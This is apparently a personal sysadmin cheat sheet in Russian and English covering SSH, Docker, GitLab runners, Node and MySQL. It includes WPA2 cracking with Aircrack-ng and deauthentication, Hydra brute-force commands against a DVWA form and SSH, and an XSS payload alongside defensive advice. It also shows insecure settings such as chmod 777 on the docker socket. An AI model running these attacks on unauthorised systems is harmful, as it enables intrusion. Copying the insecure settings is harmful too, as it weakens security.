## ssh keys and permissions
- указать конкретный приватный ключ в файле
```
ssh -L 5435:127.0.0.1:5432 ttelbayeva@10.80.11.36 -i ~/.ssh/work/id_ed25519  
```
### Установить разрешение на чтение этих файлов только для текущего пользователя
```
sudo chmod 600 id_ed25519.pub
sudo chmod 400 id_ed25519
```

# Что такое SWAP
swappines - сколько процентов файловых и анонимных страниц сбрасывать
SWAP - туда перемещаеются только анонимные страницы (программ)

# Кавычки решают все в переменных окружениях
```bash
tansh@tansh:~$ APPPASS=Pa$$word$3c3t
tansh@tansh:~$ echo $APPPASS
Pa3529352wordc3t

tansh@tansh:~$ APPPASS='Pa$$word$3c3t'
tansh@tansh:~$ echo $APPPASS
Pa$$word$3c3t
```

## Setup path for bin
```
cd ~
nano .zshrc

# paste path to kafka binary
PATH="$PATH:/Users/tansh/kafka_2.13-3.1.0/bin"

# open new tab in terminal
echo $PATH

# now works
kafka-topics.sh 
```

### grep of gzip archive
```bash
zcat ad.*.log.gz | grep -B 10 -A 10 зжанова
```


#### Запустить bash скрипты параллельно
```bash
#!/bin/bash

# Задаем количество потоков, в которых хотим запустить скрипт
num_threads=4

# Запускаем цикл
for ((i = 1; i <= $num_threads; i++)); do
    ./your_script.sh &  # Запускаем скрипт в фоновом режиме
done

# Ожидаем завершения всех фоновых задач
wait
```

### Crontab 
```bash
crontab -e  # execute from current user
crontab -r  # удалить все существующие задачи командой
grep CRON /var/log/syslog  # посмотреть системный лог исполнения
# run every month given script
@monthly /home/gitlab-runner/remove-builds.sh

```
### Как удалить все контейнеры которые начинаются с mytest
```
docker rm -f $(docker ps -a -q --filter "name=mytest*")
```
### Dockerfile
```
FROM - взять за основу такой то образ
```
### Перебор паролей для WPA2 Aircrack-ng

`iwconfig`
sudo airmon-ng start wlp4s0

sudo airodump-ng wlp4s0mon (first tab)
sudo airodump-ng -c 1 -w <AP_NAME> --bssid <BSSID> wlp4s0mon

sudo aireplay-ng -0 0 -a <BSSID> wlp4s0mon (second tab)
sudo aircrack-ng -w password.txt <AP_NAME>-01.cap 
```


## simple xss-s
```
</textarea><img src="1" onerror="alert('XSS bro')">
```
1. Используйте фреймворки но аккуратно (встроенные механизмы защиты)
2. Экранирование (замена вредоносных симовлов)
3. Удалять опасный контент (допустим все что внутри onerror) 
`let clean = DOMPurify.sanitize(dirty);` - либа нашла уязвимость в гугле
4. CSP - content security policy (white list что может быть на странице)
# Полезные bash команды
- Узнать архитектуру
`Ubuntu 22.04.01 LTS amd64`
- add permanent env variables into
`etc/environment`
### Rename file suffix
`bash
for filename in *.xml; do mv "$filename" "1_${filename}"; done;
`


### Hydra 9.4 http-get-form broot force
- `:` - Это разделитель между заголовками запроса
- `\:` - Это экранирование символа, чтобы передать в заголовке запроса
- Все что внутри `^USER^` будет подставляться переданным или значением из словаря
```bash
hydra -l admin -p password -V 127.0.0.1 http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login\:Username and/or password incorrect.:H=Cookie\:PHPSESSID=ud8cn4dlf3o7b2entm60t49tb5; security=low;"
```
if you're OK you will see

<img width="1326" alt="image" src="https://user-images.githubusercontent.com/89765480/203627350-9f00e3db-7cdd-4048-bb46-b5926bc13718.png">

### ssh 
```
hydra -l admin -P passwordlist ssh://192.168.100.155 -V
```

###
``` Install npm 
# update packages and install npm
sudo apt-get upgrade -y
sudo apt-get update -y
sudo apt install npm 

sudo npm cache clean -f
sudo npm install -g n
sudo n 14.18.1

sudo npm install yarn --global

sudo apt install docker-compose -y

sudo chmod 777 -R ~/builds/

rm -rf ~/.bash_logout

# Add user to docker group
sudo usermod -aG docker $USER
docker login dockerhub.company.kz -u username -p password

# Give permission to docker socket
sudo chmod 777 /run/docker.sock
```

### Node version management

```
sudo apt update
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.38.0/install.sh | bash
nvm ls-remote
nvm install [version.number]
```
then close and open terminal


### ssh connection by alias
``` bash
cd .ssh
nano config
```
``` bash
Host gitlab-runner
  Hostname 192.168.10.10
  User gitlab-runner
  IdentitiesOnly=yes
  Port 22
```
<hr>

# Настройка гитлаб раннера на локальном сервере - shell runner
### 1. Add user to the sudoers file
``` sh
sudo adduser gitlab-runner sudo
```
### 2. Download the binary for your system
``` bash
sudo curl -L --output /usr/local/bin/gitlab-runner https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-linux-amd64
```
![image](https://user-images.githubusercontent.com/89765480/200255079-ffdb6603-0f72-49cb-8fe2-82f9f84de4ca.png)

### 3. Give it permissions to execute
```bash
sudo chmod +x /usr/local/bin/gitlab-runner
```
![image](https://user-images.githubusercontent.com/89765480/200255254-dc84b9e1-5732-49be-8185-61e5f93bbffe.png)

### 4. Create a GitLab CI user
```bash
sudo useradd --comment 'GitLab Runner' --create-home gitlab-runner --shell /bin/bash
```
![image](https://user-images.githubusercontent.com/89765480/200255322-82ee6391-7923-45d1-8c09-fb952c948218.png)

### 5. Install and run as service
```bash
sudo gitlab-runner install --user=gitlab-runner --working-directory=/home/gitlab-runner
sudo gitlab-runner start
```
![image](https://user-images.githubusercontent.com/89765480/200255676-6706a999-2e20-47be-b4fa-1b36961643fd.png)


### 6. Register the runner
``` bash
sudo gitlab-runner register --url http://gitlab.companyname/ --registration-token $REGISTRATION_TOKEN
```
![image](https://user-images.githubusercontent.com/89765480/200257442-db1998d6-06d1-4b63-b55e-12d21c0274b6.png)
### 7. Connect with gitlab repo
generate ssh keys
``` bash
ssh-keygen -t ed25519
cat ~/.ssh/id_ed25519.pub 
```
![image](https://user-images.githubusercontent.com/89765480/200259390-2aa9bc1e-74df-45cc-a45b-65f0647fe215.png)
paste into gitlab
![image](https://user-images.githubusercontent.com/89765480/200260948-d8b7a8a2-a943-4106-a982-0e0a705f5d3f.png)
### 8. Let pick untagged jobs

![image](https://user-images.githubusercontent.com/89765480/200261610-a1d1ee86-a9bb-480a-8ae6-cd5ed06e9cc4.png)

### 9. Delete .bash_logout
```bash
rm -rf ~/.bash_logout
```

![image](https://user-images.githubusercontent.com/89765480/200262579-81e61bed-052e-41d3-bd9d-fc50c2c773e3.png)



#### Удалить все images
`docker rmi -f $(docker images -aq)`
#### To delete all containers including its volumes use,
`docker rm -vf $(docker ps -aq)`

### OS architecture
``` bash
dpkg --print-architecture
uname -a
lsb_release -a
```
#### SELENOID
$ docker run -d --name selenoid-ui  \
    --link selenoid                 \
    -p 10101:10101                    \
    aerokube/selenoid-ui --selenoid-uri=http://selenoid:4444

 docker run -d --name selenoid-ui --link selenoid -p 8080:8080 aerokube/selenoid-ui --selenoid-uri=http://selenoid:4444
    
docker pull aerokube/ggr-ui:latest-release

## Install specific version of node js
``` bash
sudo npm cache clean -f
sudo npm install -g n
sudo n 14.18.1
sudo n stable
```

## Live Server VS code
<img src="https://user-images.githubusercontent.com/89765480/184475711-fe4d7636-1a12-41d4-8f6d-96145907f5b9.png" width="900px" height="300px">
Enable auto save on VS code
File -> Autosave (after delay)


## Убить поднятые приложения по заданному порту
``` bash
sudo kill -9 `sudo lsof -t -i:4200` > /dev/null
sudo kill -9 `sudo lsof -t -i:1313` > /dev/null
```

## Colored echo. 
``` bash
DRAW='\033[92m'
NO_COLOR='\033[0m' # No Color
echo -e ${DRAW}" :: SERVER :: pulled and recreated"${NC}
```

## Update version of java
``` bash
sudo apt-get install openjdk-11-jdk
sudo update-alternatives --config java
```

## gitignore
```bash 
git rm -rf --cached .
git add .
```

## Install mysql server
sudo apt-get update
sudo apt-get install mysql-server

## Mysql
``` sql
sudo mysql --user=root mysql

SHOW VARIABLES WHERE Variable_name = 'port';  // default 3306
SELECT DATABASE();
SELECT USER();

CREATE DATABASE testdb;
USE testdb;
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
CREATE USER 'testuser'@'localhost' IDENTIFIED BY '111';
GRANT ALL PRIVILEGES ON *.* TO 'testuser'@'localhost';
```

## Alias for sublime text macos (.zshrc)
``` bash
cd ~
nano .zshrc
# paste your path to sublime
alias subl="/Applications/Sublime\ Text.app/Contents/SharedSupport/bin/subl"
# activate alias
source .zshrc
```

